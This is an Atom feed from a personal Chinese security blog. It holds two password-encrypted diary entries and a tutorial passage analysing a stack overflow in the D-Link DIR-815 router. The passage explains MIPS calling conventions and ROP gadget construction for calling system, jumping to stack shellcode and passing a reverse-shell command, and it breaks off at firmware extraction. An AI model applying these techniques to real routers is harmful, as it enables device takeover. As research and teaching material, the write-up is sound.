<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>郁涛丶&#39;s Blog</title>
  
  
  <link href="https://ghostasky.github.io/atom.xml" rel="self"/>
  
  <link href="https://ghostasky.github.io/"/>
  <updated>2022-09-28T14:00:13.860Z</updated>
  <id>https://ghostasky.github.io/</id>
  
  <author>
    <name>郁涛丶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日常碎碎念</title>
    <link href="https://ghostasky.github.io/2099/12/31/TOP%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>https://ghostasky.github.io/2099/12/31/TOP%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2022-09-28T14:00:13.860Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="e2c5514f53eb7cf393501c1c26dbb895f656db4d41b8025f4c75938aa29d79fa">f045e053d6254bea7b0b1b710a9b6ff68bbaa1de6d2484e529c210c0015bbb71</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>胡言乱语&amp;自言自语</title>
    <link href="https://ghostasky.github.io/2099/12/31/TOP/"/>
    <id>https://ghostasky.github.io/2099/12/31/TOP/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2022-09-28T13:56:49.063Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="21f2834ab8b4b6dfa9968b857be1c0603e93a201a42c7a84b3b6a1b0fb33d784">f045e053d6254bea7b0b1b710a9b6ff6ee808f17c634cf47e95b836d3b9b6b47c2d48c5194723e46875b63a4ad4bb30ddb46515dad4c6817dcf97ff2fd31abe6b1ae73d39489829d0886485b91db00013dfd3808e3a9e4dcb735fba99f44bf6af60022b8c4ac00bf648e221e9108efe76c9e0533dd01e9a0db710b38c0e695a85f73d43ad832f8336e5852c2d0409857a1cd5735fa3e0d2da121b29a64586f11de8c9b4636db1c9ff946a29534ba37769bae857cdcff65e37b01df3a64a68febcb751ae0c29f3dc0450c16d89a85ba07681e6527d0b4f33eb51ed46f6aaefe5433b6eaabf953982b3b4ff7e827d1b547a68e2be0b0b79b5e53b96fa065c37a59d49c6a4f6a07d86134650215da0ef9ceab904209006463d89767e87f5cd1d16826ec9912ce019eba28142f934396712ee13766ca85d8ebc30a42c6c05e42a8d8bb959392f25bbe466e16c1773d1cd1e56c7c44c3e46cd45595c8fcaecc04daa7b2866f58e9fc6a6e5c8fd2c245a43b4a29de924f6af7e2ce8011901b5b8ae331d537fbfc9022c29ae01c9c2bef5c2f0dcdf6a084ba6b10c1a3168c2b4b119cd082a20c343f88adfe2e0d9483bf5e130b39b1a0fefa7673f2ac61e1ce332d9c6ffeff66d9486228a6d142f61a91d7ee1c9a0d50aeaa063b7c44705ff22718fd5cde6ea315738e67315316fd5015042e0f6216ee1ae84e269c85bba0e386174e1506aa600f6e29bce9835fd195e6c66496b643bae32dc9673e02f1b9fe0c6e0ecd6a0a5045068c1db06838ad6386514eeb8c40e0707da1af93fcbf95118d1b7cf1a9683155a64fb384cb79f7502491d0b204f633728e9ec119c6f50aa2fe3f9660c274bab740ef5680c201d6bb51a2e02ada226fa523bf8854ceacf0b477ebc06b708707d7f5dbfcd3b243718bd46da2d9dbc7156f7a296b78672a3b047cb16eb2466d97110fa60bc95034d70f712e9e2a03ebccd6914a705a162035f5144fe86c5b6a388569ea658d304d3e342db6ce933169df99dca20b732d3315e537542886471c50d6cdd504a0447f9410dc0758373c36739a759279fa1a9cd2794857734eb175c3a5f94c0ce0f28156cc3c0588a3c62488970e4d02f1cb64472bd0a68af9e799b8680974d2da76e44f19505d76fa29dd9f5a7de064451607064b1c98a89a5d4f085fa288970f1dd69daec60254c17bf5917847caee3a973ba9792c6518875161744ab2ac64dc482116a5df2544cc748f5fcdae412496ceb491261b54e4965507f97207c7f504d5865684c4aa086d9da970ee26633c2cd3bcff08bb46f7a3d8018264262490e959c9014549d4113fa96c3b9bc7ea2b87328f440526729ab254ce21a6fd582471e210e467271389de7220e703153cf9e1025015e9fd7729eb4af5622bf0f91148bec143557205751e7505105ee2ac951f95d0d7cf916ac8d1f9935ffa7288a30054f09ab683b42cf0d1eb29cc33106e7e123bf129855f7ab84b9b22e0d56a79f05c733043d4884e69af9fe1dd39dd71dad74536ea9880c7ae2e00c7c12ecb87b6416ea03413da7771866f240aebccafeb27fe732ba00e0f80991f476273c2edf1d588f642a0f165e2ca7132fab24e1a137e2724b2ff622405b152877ee2fd28dc3729335e7ff9f97d5bdab32be19c45209c7b975c30ce1092282721d6567146252100e1a7de261481e00bba189d163a6c3bb510698b10701afba43ccbf025e186f2b3c95f63b0babc57a3b7af34a9d9cb9010d0e10d34d99562be602d17db4a1576ba7e5386eb6ba61e66da6823771234c80004418e9f3f1c9001137a0e6d45852910864719caf644d33646a920672f34be0cdd51dde9089f5f04edb8ba86de7508588624e76d3509175824c79279e7bdd33c86cd207eec31a0f75e570ebb3d0b559311ce4a70145eb2436e94aae1290cdc98c4739fa478da698211e72dbaeef02cc92baccdea765cd6a17eb7f81bb5a82d43ddc2316fed1950789410baeaa7099f9256d7ea0db25bd035c3f19f5c505d6e2f793278fab07eb98a039518ff833813520b87cbd1a1cb7fc2c2ef527e7c43aa5cdbd3eb04c43b56a57e8615958e903781a87699d33ed960cf935d47c76cbca352071b959c8d435918a142dbcc77b9005f5d759262d2ed37d588fdcf64192ae65f0ac5fee073dc5fd772c73ee44ec875d3495cde268c9a853bdda6cb3f152f8a8890ced5ab72ca8f7312b8f7b2a475abf60b854605425c8054decd8b45101bbbb200aadc1b9b396d9dc030c8ca9e5680e3f2db0f570688dd1540df060f36013dec13af34cade65d5ca710fd99e43fafa3da565471d3da60f132111b1303ca82b46ad6fc25cfdd78095a375fac3fdf57c523a8de5ad7e81a897b1934f524196cdd82f59263e60ebf9bebf171dd45abd688519cfcf0f19f7a33dfbd41870a246595e2c88b01d6ff42d9bc814c2daa727a49ac133c964e5254992fc9c2d31912a9e88b510734633c86433bd4abbb7f9ae7d9a91dc819c37b6b8a50f3a5d3b131589c3609a9e90c53777fb9de2917f495ace7877c28581fa0a3b0d3b07affe5d0e0d6b894831cc8d8647838a2f8a4346a7ad467871be9587a73b1c3942f8b216679f5bdaae25c997958206920cdee7c50ab446822bcd7a94dbf762085e1d60d842826b3a0be21e8e16a7341b0fcb3b2bd7b148c8473be01040927891966f170fd56625b5501a0a49535b7517918b031e6c644ba884220004b08ba77fe3170424d51717caa7e1b4da974c1a33df17ff21ec61b13c58f0d25525da602417374ec291bc786968ec7bdd98245c963158ddde3f1bb16b8e7b22e4a9c6531fa973d02d11ad12e0acad0c65b970fc3e5c09c3f64293769a995bf5b8a826d732a61b41fa6309af19cf158a52307f656cbbafac066555768d1201064fa1f67b044f729477651b898982c3ef872af202b201e24a3561036e9c6b3a68aa1885bd1eacadd33f2c6279fc0013ce23125fb5945d1b477d5042ba1eec31aa49f98fce994689814e4f0b69b37fc12d122942bfbc567464e41482fbbb4c9ddd4fdac9f0d05dbffe5ee2542577785aaf8b5153463bc0160ed77ef13a63e9a3a1486f485e6555a2d1febfb49909a10711432dc651336e58cb78df20897850a11a2c83fefc702edb42817adfff6c6a29cfc5339806cdfa333960fa002bb686f7f6a4bdeeac6c1068a369c8739be84f061c6b101c5aa9ea26cafa6b2f08ccfa1a4ae94c3891f119829920a3d2db287a10959b6a6fa8a65b581db9e4daf420a788a64b77da8f560d721db07a103bfa34b36d121bdce921b724cc83bff2d6f912940e57cd4291d3e0245af2f3c1005c14b0fce4429494c94276ec10b7122282d16ac0d1a3afbb9bbe100cc976f8bc56028471043a019b548997f3b78222fc76b8ea13376ce59dcb894299e8d52b6437b837feebb069acae644ec94c1fe687ac14aa43ea27d2d44355063844ae58093896df73e618629053c641d064d4af1fe0c952b20e230bdcc76370397c94f5e13f56e00e41b77edfb25ac735a3ee042fa953bea8efa009e1145c2cd9058e43818567e0fc4c37a4117c49360916cb2f475c2a00b39e395aa3fc76b039b4f68ed70474d90a4b3e8adcb0f1fb349a5606b2234e4b3c501f7a7db180c43c180871fef4a776ada933a7587555ded5ed0acabe6445f71df1ba9370915f3dcbe6bbb46e3a0a6f6f162f5ddfaab332bc9feb49a973c2f3cb1e17f6dd6c9aa3fe3777052214c76621544ad55fe687a770f75d516ebad1829da0429bfeb864c438d705d10af23b4a943aa35a516b96bc57e334116a263b6f4d469698eaaa6bc24f1f8497fe11ba53090636e2c77c8d5693753a48f5d14a74d8e40a9110ec889ddd4ebcf3a31d118539c19f76f036039c156c6a72f8db3493d7f94aba4545dd5632c4d7dccc66d84848e776250e7f3988ae12ace920a358e17ed369c831029bf6ee6b1d0b9892e1c40441659077ca419555fc51cbdb50584a4eecdbfb5b7df5764797b2246f3aa27aaa2fa4fc7ba630c0870b9d079593577d7bc19b1c2db0c166436aaa792c06a3a9b0524635366f8de0d8aee2049f2ef2498eaceb60fde338c4aa8ae0a73c9f290017f951a393f0fd94f0a68df26b6dc599c7521fec067f7a6bc86fea819d789ec60672ff6b01fd8f49dbdfa98c4d1c92d82ef22fd24a769ac79c5d4effa5d06bea9d63692020691548bdd9ab983a584fcfe162ae24ad94373f21d8481c9e8501653eff0926303058d35878e45c113c52346b94b4f25f5c8cfee701e95681ff747aa24ca7371bad15068958038fb2cb5708b92d3cb204fa13d4b6fbfdb9da0f7807d8ed8355fbb0bf7bd4c13f4ee26c766baa577d726aea02c60db4c1ced80c69f732965bdb53786d8b7e89dba5f9faf1c9c8638207e371e813ab0b7a5257d2cf0c8763b6fe283afff829e55617afac49588d10797087b9990a34e7b31fe752b43809bd2be131f3c2cd890742e5d5bb5376a1496c26800b8fea72518b175b46567d882016d633dc51d05e3ec9131088e391becda5f15970e435b8f04e9b086c3d1c8274864d1475eb2963f3d6021dfa8b4bef44e05e51d5e097c8a128b9f9fb362703f0b82fdb2a9a10cf2cf6e7ec2d3e354c4f95968cf3c112f9a2455a4cfb950e59a122ace408d65fd3966bdb0a0061f053bce029b72ea3026599ef6eb3cf56211def857fb9dd837121594d15763e127b6d7be40b48f799e9de262a8c634326f254df8d9d4944043242778151f9c0e26428d95a0c7a5d6db4eb8b0843bc4fe89743ae9abd313777aa20ee1d6e6e15338856a15f31106cb319f8db0860f96d0bac05f137837b6f7392b9e1a110c8ad3d77760aa9b5f48f0a23888956bb0c1219041769412a72281a7d035be7d1b01560793ea6c922fc71ff56095a718ceee8847459f8d24935dc6ca5bfa5bc8f8104808b2bbc8786ddd57366a9b4e55fd5f3564da0192bb4413d022bb03d07054e76a86d4da203a4c84f1024414878d65e762839d580544ff71164389ec64acfd6bd8cb070e689e504eedcbbe88977ccc200fe5536656b59b7d51a97ef1937a198cd20894cedd1fb3aa7289cff1bba687661a1d40eeff3d5e6f5ceb64ab18bdbac6c92d9ce7594e0d22a69d7015dd7489fb54eb74cab4c909eb196458d51da093feaba4882ef3172e614ab38d14a5086f24ca78805f653b23d3021f0e23c18a0eae7a43a881a35762f9212de2baff8f0d2b7f2b6d50f9a2cc8717792746b5b3642f6de3a6a858b8790d8610d0cd8063a45e3ec6345460ea8e4cba9c3e889f2f249bd56eb21083c4d402e2cd91bd0624d7eaacd0d1776780f21a59df6208c09ef4cb86007938639182a7b4a532fbf23940d7e3bff8c95d769146da6a84b6db5b32709ba0a032d88c155ed9c5b798ceae9a49b0eefde27b5ade72ed87cdbeb1143c93aad7c0da4d2e08116254c19b55a74fd66a000d632aec972f5741a4d438079d3f5e724dd8424732496fde695a4f252d5b4755e36c4289cc3475089ca497eb0876cc72f618aeda0580252ddafa958bfec80da9aa9772144222bd44edc444829586aa0823b47436fb4071e3bd9ba3bb1aa415f2b8fffa464a070aa4fa8ab11adbdcaf4d16e7f6d08f6262445efcb4a7daf85a4fa4a1a33d1af978579b8a222640e896cfbcf927eefe935887c98124bfab578ca2e8cfc446b925ff6611fa7fc8fb547a7eb7dbbe4b7580cc6221296ca3c092509b6d9253357399d7b331ac9cf5d58ce929820b35dafd1af0a8dced4a4861abaa411423d7e0ef9a2398fe72744a85f0c40a4cd6070ff9a721224dc8259a1407897cf1bf47b4588ad615c3de1e29f00f4520d96dfab8ac0ae7b6e742e311f12c0c7508db90ceb596662f97cb068b740651e8789c195e9a3e04601142d59bfa7a2a21ee75d0e41737243d9b74bfcbffc4eb4ed155ff68a7465062b2a03234d21f980f1e47f057dd8bf36ccad1c69e4e686b99d54af9fe3aeaa7bc07969a1e2173d4b8530b479b87741f0b86ed483d9eae4543d7cfaa73eafd6914ce734d788500f8b09bb9ce77f584c382fd96ca2bf7d163a652deab4570945a42e21f838685fa5fa993209fd07599f517991401c11e8f9469b6421aee89972b045e786a4ad804ffab4e3dc085a18b6c4794d49928b574b019b14f25a497f70dbc8becbc65e4436ec6c330023f270dcaa8be899e1c4605aca2b710f7d2675a7080234c33908c6aac2f90f261c10a526224f019fcf660e9e6de1ffa2ac1f25cf8004add67806529acedeb550d7085501273dd22732f36e8bad0278c79b4482bdbbdc506036080ce37d1c40e3d364e99571f957223d5539cde9af78bb2a3f1da9595b82a0e865fdce942f418f82a533d27335fa9322e5b890d0525e98c213518df9ee21f0f4adeb764ae76ee186c31a980e5ede50bf41282f31ffde624b12033b8e48d9ace2a493f0ff7df98c9c3c7f7630fb0f8cc033a981f0cf8e23739dd177466d050d60eb80d7143cfb31d6c97d64930cf1eb2e04c5289f3a3e76de0c90dab051ad574a8a53256f8aa41713052b3be3a703af40255e029f268dc1987150f28e2a0169f552a51f011cda99e8ccd674ed0740121f85676dca79d048181c8be82c81bb0d8936b520547855db7ea4428c1d8815ad3706724eefbb8437869f40ed000fedb210d34638f638ac9263c2311dca0a20a2641d08cd9df75d0c43d18c320d24f287ac1d661643df07f2761920a1d23ac09d7b01bc5b233fad5ffcc63065c89ec9bb0ff0b25e42fec28bfe420e0c89856a74f76ea28f23917c66a14fc142dcc4b9c648a62045072ac1c082c5f155459ec6bcca89c28164c39f0d01867d68b75476af4b953dbb36aa341d4c6392e9a867226463552840da2416a69fc303ba86571f04ae60badd95cf68513a3738c2f8dc0214a607ef4fbf3c400e0c310dbea01217518fb3abdb74ccf540e591da5dac48d7171a5759b5d82fc10e4ae3a2bbc2dac4dc9d40f315ffaf2c0724fb36f42d2bdd06fff2c9f84929c09cd3861a6d5bdae273f391a7972559b9f71b000cd82c53d9f31903a7a59d8e4fe7862076de25c82daba50aadb5246fcda3aa2d573d6fb29e509a3d0da6b2d5b1ca331282a009d1cbbd93e6a06526f121e47d985679e1dca6aaf0e1af84e12c4b127ef844f5301416d2dfee193a0a82a058c6af51c1aa4a3d85ed01a8e0d825399c1588de2eb40202031cf6f9306c285e85ee29210bbf27f89051f01dfde1ed981b7a6722fdcdbcff52c44d18249c5678285472122089670fc53f837360ee925c78a4b7614627154e6738d8eea7282e22a30013bcb681e93779e04c904878d0738d0c81a15a7594375c4dacd26f41192b90a6a2f6dd34e375ba2cf97dc7531bd9d9e8c715eb37c90d8596eff14a139308e35d67c72974896a4a6cacfcebbd65c44ba796440d7f521718000aac3a5af2de13e393b08b0c4486ad62800d90bb2254da3c3edff68b773365339a208f884a1bb4aaa425658769b75a32a60162f5e097f5ec3d072b279a39e6b238b1e999d2eae4de78b1060835ebb7cc41406c4924029d49497cc1a27e94ff707508f9699a0238e8b202a8aef0d0e5924388cf104601fe9a5020b1d1efc4a9b2e1c87390d44e3d19253f686811fc04025989bc247790f2b0c5294befdd153078be063df0071af0318802794729a4b93bd207f8c026deb9e406841b220888d7a7c792a4bbf139cdeec4f9a8fba754a3210091431833e69956226b79bf8f6c85d78edc95529c072790161c336e3a2cbf3649c6e37cdc96b066c158c2a11d831221970bf37d6ce7f8ed139f66b58711105f9d8cdf1fdf1c5283a0911265bcf366754edb83798725a2fae66df3f0aa5f3854a2ba7059c20006d19469ea7ad6ad96e8e61fada75648aa219b54cdbe43a9e2469066dde65aaa2680196ff92f73542de8cbb8e114ce71f595e2921a0ba8a0ec4f0fc1164d7fe84a43a2e642bbb6964ed6fd7dbdc60fa4e27cd583f46e94949cfed998f7c9b9bd3248af0065f22ab775810768456deada1355b579870f1f370b3c00e021236c6b0102cfcd86e4a762c536ca1f7765c3910409b5e0a984977280f4028d5635839b093919f73a578c23aec71f23a9e395b24148cff18d1d86ea306aebacb8149e534f9ff29aaf05434506f6df7741074f5c5387f5e810698710f18406ef0a0e8e93460f534eda6d00ad42b0b04bf3a883bcfc148fa49813c78f4e202a60454d2043993d734216fb5460eeeef4425d60f88c901d8a2fc7877fc62d80e2b04a8e2f5b31b4b1e2b43e602f94639638e335b62ac6e3b62a6702bf82fa72bd40fef66ace428019bfd0f34bb7fc2121ce8c9249d67a65ddddd49fb8afaef14f3033ff10dc9eef07a7a7208c73309ccf27976b5a7015526b226fb8b65860935696fd5bd35e79cf19bb77ae9e34363f5e2ae4c494235f91ae3a5261db135508b8585509fc8b406fe28ed5421de2ef4f9188f4ad1ef79d5d058e84d46e5d8e7ec4ddbdbc50037132741cc81fa62264664d83c19cf061c011fb2f03f7b08bb1cea9210a352a0e59e5a0d91f80d0e2b43d9430320690bbb9496ddc9f5b7f66092a7b314f45163eb3b00f8eeeaa3def189296b2d763faf7d296b445a9fa7e2450e2c7cd30dced326992ddbd772648be540a11ec2bbe46ea27fcbf287f4fb98714a36a7bac3094c4996fb8e7e2943fa0c68473dfdeec70bc0c165c6947c98995f05ab4213fd91e09685c6dc59f71aa8d4205fde8ce68dda9a69e7491e8636a45c71551e6bb50be7cbd0e9824edb62669e548d871319ce02227c47274a1bcddac99ed9b7ab704cc632135db22b4964d7bbf34c232d5d29a475d650d690bc69ecf99a931a21fbe0406bfb4c0302e041d3569b223eb1152960cc719c0fdd75e4d627a6a5b8ed5d8e6ce10085872bbadcc809a46cc5ab4fc64f4119ef9fc0151be64e3bebddfbb8a36af231dd1f826e92800c0310328053aedf396e50790a833c3b8043af520c460768295d745fe48055a411f47cb2a5b3c464a715f7bb268a5ec1778698ea1e8670c928cb49f94531ad0fb3e1bc0330d5ab9c7741d9a27e2252bdd467a749e2c5a224a10532091a3ffc614ed5c3702142f5c1fc7faa39b762936640ce8f1be9b7bd4254c6292d786d23df62e80e9a24a0ab6a039174ac9fea601b29c52257c8ab7031edc59f76ecb01417f381dae0e4757c4e0324f2b5c5f62d6f92333d3a5a870bdf1810a5bdf250e730c9ed35cffb2c2d6cf73e9db117a3af60501fe7f194864efdee6305456b56f22288e71b8ac7647e95da8586b006575d518f783b0c1fb5aacfa32eeb797827a7d622ccb4ba57f7d9d957d872c435bd5b32933bd7e1dba23c3cee53bff3b7ba1f9da31a3b1251fef91e53a405552a6caf7cb4210e58e00e37513d745e3ff172b5566cfd2ed219550e61ca441209551fe1f390b1bf0a27bc26768d19546c6c74b939862b83068a2324b8421f0056d10cabf21893ad7709cc9c4d402f066c35288e6fd75698ed24341d5deaea72f769a176530cf4e7b69b222212a5f371e2ce38e0c1aaa1c73b31a0fad11a825aa7c51871996c054793377d27bf1659893326d7e7ef98c7441d1124d2c3ab1c400404181313e6d9126a64d94d6ba1f8a5a7ff63b98b91dea5be5260c280354a322b70196b6d40de4142ca07ad7dad3854840b27050ffcee267e1b2e393c7b9bb5fe7d8a6504aa03e7241a1eabeca7eaf91dd0daa5e8d3152e00bafe8bd590894a4bdeae5ad8e2980a7905c619f95c724326636999e7cd600e290a057a8f8bba4f39a5c481f3e2c3318325737300b097462d0b8bd811cc730e5118ae26fa630987d18de2751d637775c9d74b8ec99ef6b0c313332309ebc9e0cff67cbe05b6b4c9c37bc6b295af04ecfaf89be039a1c8e570842ad1b930b6c89c28cbc60b4dd2b5414e033c6932fc438a28b28662797e7c31c4aadbcf7ed5ebfbe397bd5c4c9e273ac4427f23333411ee9f0dbc5606377bb72b52305fac8d248bb849108c5b085f1c7a9106b46381dd2b81682613fff42f23afec819d95a7ef33f7f20fd34357ffc20a82f5fbeb1cbf98d609a7b55abcddde90067e5067e578d724d123f97470955d38419443e8631efd604e9866bac269ccec6637e40ec92ab4c1d84e3fd68fcd9cd2dc5a44c0ffdd140e6d318a7aeaab3f5c8192ef7b8579e9d1ab852878969f3e8b081546a9a0976180451c9f29bf2d16e06908ef6838cf5ea9159167dcd655fd1a485bf01a52855301051e09988d4074aa590525329e70f09b469f22f43476e20ebf803fa916e2f3feded161d3831b58c054ccf5c559ac6ba26a3ac6755b1b877dc9139be0e0b6d594aa47ba47da35238361fb2eddc5395aed8d2f24834475e4d87c75079da33110f9f48bae30a814f32165e8c37e67fd3396b3e4c73ac9eecce100d22e2b056f684cacd845846eae0696aec480983b62102087ca3cb6dd702587f004872af22e41f195c732a70329a80b8b1f3418a247c2a80ea074318c2cd2a5faf64cc04eb0398935966f15f7d830b5448287e704b98d9fbc87ef4d46099e73e23367d78c8ab714d056a9bf45cfd388431b15a7608daf8f28424e4159b30c2d94bfe9a7073359b9f2da5f206b895ee5544c2ff73c42f7e3f38b393f54bf657ddb8d36a16fab929f34b9f9f14cf7c4e5e0bff96194701bf90b34d0829c586320d04c83df1c3ba0033ba03f4e075c5f5d8b01c6478bdc29dcc25b058f0be7c44cc73a4ec1f84808028108c6058943e2a86c28947e0c9c3ab0e9f276ff5e0fd415bebf84323b695b2da8688116ac1f967c511ad91e23261050024450657efa1563ba7a734478321beffd9f15c260e99061e0637e768695b8aa8391c28f41a30aa0f86cc4fe91658b2688a5a148d2e593e128708b471d6553db92efa9a07134cff72af91e4c4fe82216d157f46e0f41c1d62e8034c17bd9309c1feaa6dbbbdd13dcb9e039f21f7f2ddaa7dbdfd7e27dbbebfdba244ea0d9419b9a7524524d1d6e3d285ac2cfc172dd88d2caf6b1f39773785bfc4f1a1c816541802432d568e52b6a55a9234f9316f52500ca54464e40d30482782526969d96235da1ecd4375b41a09447d532fad3629fcca405801436c163a325ed75b5777b48734fd9016ab0bef5026a72f42a2e7890b5fb9df51596a0abd2a25239de4b685cc8a875699376c4aa1244abe3e214fc7a2497d03308946f4d33b51edb0e3a8f9cd07277432c7f26ec67548db3bac42da63f0aca5f675e4ccfc3f98ee25e185c60bbbc6e9e2740645eafbe6e7c363af09a5511c64bf0819c4bf9b46149fd156046ac4e75ca95e7cb1e2ff951ac59c420b03941ae330dc92e7403a6f33a6747a006cb589e1770a6c75e11a51ed797632eb80d94ef4cb7d53208ac136e3dc55477332c1342bb5b7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>DLink 815路由器栈溢出漏洞分析与复现</title>
    <link href="https://ghostasky.github.io/2022/10/23/DIR815/"/>
    <id>https://ghostasky.github.io/2022/10/23/DIR815/</id>
    <published>2022-10-22T16:00:00.000Z</published>
    <updated>2022-10-23T11:17:48.579Z</updated>
    
    <content type="html"><![CDATA[<p>没玩过IOT，搞个简单的分析下</p><p>踩了非常多的坑，光环境就搞了好久，，QAQ</p><h1 id="MIPS架构特性"><a href="#MIPS架构特性" class="headerlink" title="MIPS架构特性"></a>MIPS架构特性</h1><h2 id="叶子函数与非叶子函数"><a href="#叶子函数与非叶子函数" class="headerlink" title="叶子函数与非叶子函数"></a>叶子函数与非叶子函数</h2><ul><li>叶子函数：函数内没有调用其他函数，返回地址直接在<code>$ra</code>寄存器中2</li><li>非叶子函数：函数内调用其他函数，返回地址<code>$ra</code>首先通过<code>sw</code>放入栈中，之后返回时使用<code>lw</code>取出返回</li></ul><p>不只是<code>$ra</code>，其他寄存器如果使用到了的话也会放入栈中，比如<code>$s0 ~ $s7，$fp</code></p><p><code>$s0 ~ $s7, $fp, $ra</code>在栈中是由低到高放的，所以写payload的时候可以顺带控制</p><p><img src="/2022/10/23/DIR815/image-20221023001551632.png" alt="image-20221023001551632"></p><h2 id="流水线效应"><a href="#流水线效应" class="headerlink" title="流水线效应"></a>流水线效应</h2><p>常见的就是跳转指令，比如在没跳转之前，跳转指令的下一条指令(分支延迟槽)先执行，之后在跳转指令执行。</p><p>还有缓存不一致的问题，比如指令缓存器和数据缓存器，两者需要一个时间来同步，所以需要sleep，最好还是sleep一下。</p><h2 id="跳到某个函数的ROP构造"><a href="#跳到某个函数的ROP构造" class="headerlink" title="跳到某个函数的ROP构造"></a>跳到某个函数的ROP构造</h2><p>system函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00053200                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)  # Alternative name is &#x27;__libc_system&#x27;</span><br><span class="line">.text:00053208                 addu    $gp, $t9</span><br><span class="line">..........</span><br><span class="line">..........</span><br><span class="line">..........</span><br><span class="line">.text:000533E0                 jr      $ra</span><br><span class="line">.text:000533E4                 addiu   $sp, 0x48</span><br></pre></td></tr></table></figure><p>最开始是从<code>$gp</code>寄存器里拿了个偏移之后与<code>$t9</code>相加，这时<code>$t9</code>是函数的首地址，也就是说跳转的时候要<code>jalr $t9</code>这种gadget。</p><p>最后返回的时候是<code>$ra</code>寄存器，就是说跳到这个函数前就要写好<code>$ra</code>寄存器，一般<code>move $t9,xxx</code>这种指令后会有<code>lw $ra,xxx; jr $t9</code></p><p>可以直接：<code>mipsrop.tail()</code>寻找gadget</p><p><img src="/2022/10/23/DIR815/image-20221023170945604.png" alt="image-20221023170945604"></p><h2 id="跳到shellcode的ROP链构造"><a href="#跳到shellcode的ROP链构造" class="headerlink" title="跳到shellcode的ROP链构造"></a>跳到shellcode的ROP链构造</h2><p>mips一般都是栈溢出的同时将shellcode放到栈上，之后跳过去执行。得到shellcode的地址的话，可以使用如<code>addiu $s0, $sp, xxx</code>然后<code>move $t9, $s0 ; jalr $t9</code>跳过去，可以直接<code>mipsrop.stackfinder()</code></p><p><img src="/2022/10/23/DIR815/image-20221023171343705.png" alt="image-20221023171343705"></p><h2 id="system-cmd-的gadget"><a href="#system-cmd-的gadget" class="headerlink" title="system(cmd)的gadget"></a>system(cmd)的gadget</h2><p>这里会用到nc反弹shell的命令。</p><p>system的参数在<code>$a0</code>中，可以使用类似<code>addiu $s0, $sp, xxx ;move $a0, $s0</code>来实现，mempcpy函数会有上述的gadget：</p><p>由于流水线特性 ，跳过去之前<code>$a0</code>就已经给<code>$s2</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00015B6C                 addiu   $s2, $sp, 0x280+var_268</span><br><span class="line">.text:00015B70                 move    $a2, $v1</span><br><span class="line">.text:00015B74                 move    $t9, $s0</span><br><span class="line">.text:00015B78                 jalr    $t9 ; mempcpy</span><br><span class="line">.text:00015B7C                 move    $a0, $s2</span><br></pre></td></tr></table></figure><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先是binwalk，提取</p><p><img src="/2022/10/23/DIR815/image-20221021163527135.png" alt="image-20221021163527135"></p><p>32位MIPS小端</p><p><a 